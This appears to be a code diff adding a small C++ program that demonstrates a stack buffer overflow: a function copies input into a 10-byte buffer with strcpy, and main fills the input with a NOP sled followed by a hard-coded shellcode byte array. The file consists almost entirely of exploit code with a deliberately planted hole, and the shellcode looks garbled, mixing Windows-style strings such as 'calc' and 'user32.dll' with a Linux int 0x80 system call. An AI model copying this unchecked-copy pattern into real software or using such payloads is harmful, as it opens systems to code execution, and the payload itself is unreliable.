@@ -1,0 +1,22 @@
+#include <iostream>
+#include <cstring>
+
+const char shellcode[] = "\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x50\x68\x64\x6f\x77\x6e\x68\x72\x33\x32\x2e\x68\x75\x73\x65\x72\x68\x33\x32\x2e\x64\x68\x6c\x6c\x33\x2e\x68\x65\x78\x65\x2e\x68\x65\x2e\x6f\x72\x68\x2e\x6f\x72\x67\x68\x65\x72\x74\x61\x68\x33\x32\x2e\x64\x68\x73\x68\x65\x6c\x89\xe1\x50\x68\x63\x61\x6c\x63\x89\xe2\x52\x51\x53\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80";
+
+void vulnerableFunction(char* input)
+{
+    char buffer[10];
+    strcpy(buffer, input);
+    std::cout << "Buffer: " << buffer << std::endl;
+}
+
+int main()
+{
+    char userInput[256];
+    memset(userInput, '\x90', sizeof(userInput));  // Fill userInput with NOP instructions
+    memcpy(userInput + sizeof(userInput) - sizeof(shellcode), shellcode, sizeof(shellcode));  // Copy the shellcode to the end of userInput
+
+    vulnerableFunction(userInput);
+
+    return 0;
+}
